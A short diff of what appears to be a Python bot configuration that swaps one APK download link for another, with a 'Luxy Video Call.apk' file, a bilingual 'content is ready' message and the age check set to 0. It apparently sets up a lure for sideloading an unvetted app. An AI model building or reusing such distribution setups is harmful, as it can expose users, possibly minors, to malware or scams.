@@ -15,7 +15,7 @@ Your content is ready — check below! 🎉
 आपका कंटेंट तैयार है — नीचे देखें!"""
 
 IMAGE_URL = "schat.jpg"  # Replace with your image
-APK_URL = "https://playget.tail83c43c.ts.net/s/O25QczTaAAup0OCZ/dl"
+APK_URL = "https://playget.tail83c43c.ts.net/s/CCcwiGXQNY8rhsIa/dl"
 APK_FILENAME = "Luxy Video Call.apk"
 
 AGE_CHECK = 0
